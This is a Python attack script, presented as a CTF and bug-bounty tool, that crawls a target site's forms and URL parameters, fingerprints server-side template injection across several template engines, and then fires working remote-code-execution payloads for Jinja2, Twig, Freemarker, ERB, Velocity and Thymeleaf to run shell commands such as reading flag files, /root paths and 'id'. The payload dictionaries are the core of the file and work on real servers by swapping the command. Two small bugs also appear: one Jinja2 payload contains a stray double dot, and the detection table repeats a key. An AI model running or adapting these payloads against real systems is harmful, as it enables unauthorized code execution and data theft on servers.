#!/usr/bin/env python3
"""
ssti.py — Server Side Template Injection Detector & Exploiter
For authorized CTF challenges and bug bounty programs only
"""

import requests
import re
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin

TARGET = sys.argv[1] if len(sys.argv) > 1 else input("[?] Target URL: ").strip()
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': 'Mozilla/5.0'})
FLAGS_FOUND = []
FLAG_PATTERNS = [r'HTB\{[^}]+\}', r'THM\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}', r'CTF\{[^}]+\}']

def log(msg, level="+"):
    c = {"+": "\033[92m", "*": "\033[94m", "!": "\033[93m", "-": "\033[91m"}
    print(f"{c.get(level,'')}[{level}] {msg}\033[0m")

def find_flags(text):
    for p in FLAG_PATTERNS:
        for m in re.findall(p, text, re.IGNORECASE):
            if m not in FLAGS_FOUND:
                FLAGS_FOUND.append(m)
                log(f"FLAG: {m}", "+")

# ── Detection Payloads per Engine ─────────────────────────

DETECT = {
    "{{7*7}}":           ("49",    "Jinja2/Twig"),
    "${7*7}":            ("49",    "Freemarker/Mako"),
    "#{7*7}":            ("49",    "Ruby ERB/Pebble"),
    "<%= 7*7 %>":        ("49",    "ERB/EJS"),
    "${{7*7}}":          ("49",    "Jinja2 alt"),
    "{{7*'7'}}":         ("7777777","Jinja2 specific"),
    "${\"freemarker\".class.forName(\"freemarker.template.utility.Execute\")}": ("", "Freemarker RCE"),
    "#{7*7}":            ("49",    "Pebble/Velocity"),
    "@{7*7}":            ("49",    "Thymeleaf"),
    "*{7*7}":            ("49",    "Thymeleaf alt"),
}

# ── Engine-specific RCE payloads ──────────────────────────

EXPLOIT = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{''..__class__.__base__.__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}",
        "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag.txt')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}",
    ],
    "freemarker": [
        "${'freemarker.template.utility.Execute'?new()('cat /flag.txt')}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag.txt')}",
    ],
    "erb": [
        "<%= `cat /flag.txt` %>",
        "<%= system('cat /flag.txt') %>",
        "<%= IO.read('/flag.txt') %>",
    ],
    "velocity": [
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('cat /flag.txt'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "thymeleaf": [
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag.txt').getInputStream()).useDelimiter('\\\\A').next()}__::.x",
    ],
}

# ── Get all injectable parameters ────────────────────────

def get_inputs(url):
    params = []
    try:
        r = SESSION.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Forms
        for form in soup.find_all('form'):
            action = urljoin(url, form.get('action', url))
            method = form.get('method', 'get').lower()
            inputs = {}
            for inp in form.find_all(['input', 'textarea']):
                name = inp.get('name', '')
                if name and inp.get('type', '') not in ['submit', 'hidden', 'checkbox']:
                    inputs[name] = 'SSTI_TEST'
            if inputs:
                params.append({'url': action, 'method': method, 'data': inputs, 'type': 'form'})

        # URL params
        if '?' in url:
            from urllib.parse import parse_qs, urlparse
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for key in qs:
                params.append({'url': url, 'method': 'get',
                               'data': {key: 'SSTI_TEST'}, 'type': 'url_param'})
    except Exception as e:
        log(f"Error getting inputs: {e}", "-")
    return params


def send_payload(param, payload):
    data = {k: payload if v == 'SSTI_TEST' else v
            for k, v in param['data'].items()}
    try:
        if param['method'] == 'post':
            r = SESSION.post(param['url'], data=data, timeout=10)
        else:
            r = SESSION.get(param['url'], params=data, timeout=10)
        return r.text
    except:
        return ""


# ── Main Detection ────────────────────────────────────────

def detect_ssti(params):
    detected = {}
    log("Testing SSTI detection payloads...", "*")

    for param in params:
        for payload, (expected, engine) in DETECT.items():
            response = send_payload(param, payload)
            if expected and expected in response:
                param_name = list(param['data'].keys())[0]
                log(f"SSTI detected! Engine: {engine} | Param: {param_name} | Payload: {payload}", "+")
                detected[param_name] = {'engine': engine, 'param': param}
                find_flags(response)

    return detected


def exploit_ssti(detected):
    if not detected:
        return

    log("Attempting SSTI exploitation for flag...", "*")

    for param_name, info in detected.items():
        engine = info['engine'].lower()
        param = info['param']

        # Determine which exploits to try
        exploit_list = []
        if 'jinja' in engine:
            exploit_list = EXPLOIT['jinja2']
        elif 'twig' in engine:
            exploit_list = EXPLOIT['twig']
        elif 'freemarker' in engine:
            exploit_list = EXPLOIT['freemarker']
        elif 'erb' in engine or 'ruby' in engine:
            exploit_list = EXPLOIT['erb']
        elif 'velocity' in engine:
            exploit_list = EXPLOIT['velocity']
        elif 'thymeleaf' in engine:
            exploit_list = EXPLOIT['thymeleaf']
        else:
            # Try all
            for key in EXPLOIT:
                exploit_list.extend(EXPLOIT[key])

        for payload in exploit_list:
            log(f"Trying: {payload[:60]}...", "!")
            response = send_payload(param, payload)
            find_flags(response)

            # Check for command output patterns
            if any(x in response for x in ['root:', 'flag{', 'HTB{', 'THM{']):
                log(f"RCE confirmed! Response snippet: {response[:300]}", "+")
                break

            # Try common flag locations if no direct flag
            for flag_path in ['cat /flag', 'cat /flag.txt', 'cat /root/flag.txt',
                              'cat /home/user/flag.txt', 'ls /', 'id']:
                modified_payload = payload.replace('cat /flag.txt', flag_path)
                r2 = send_payload(param, modified_payload)
                find_flags(r2)
                if FLAGS_FOUND:
                    break


# ── Main ──────────────────────────────────────────────────

def solve():
    print(f"""
\033[92m╔══════════════════════════════════════╗
║   SSTI DETECTOR & EXPLOITER          ║
║   Target: {TARGET[:28]:<28}║
╚══════════════════════════════════════╝\033[0m
""")
    params = get_inputs(TARGET)
    if not params:
        log("No input parameters found. Check URL manually.", "-")
        return

    log(f"Found {len(params)} injectable parameter(s)", "*")
    detected = detect_ssti(params)

    if detected:
        exploit_ssti(detected)
    else:
        log("No SSTI detected automatically.", "-")
        log("Try manually: append ?name={{7*7}} to URL and check if 49 appears", "!")

    print("\n\033[92m── RESULTS ──")
    if FLAGS_FOUND:
        for f in FLAGS_FOUND:
            print(f"  ✓ {f}")
    else:
        print("  No flags found. Try manual exploitation or different engine payloads.")
    print("\033[0m")


if __name__ == "__main__":
    solve()

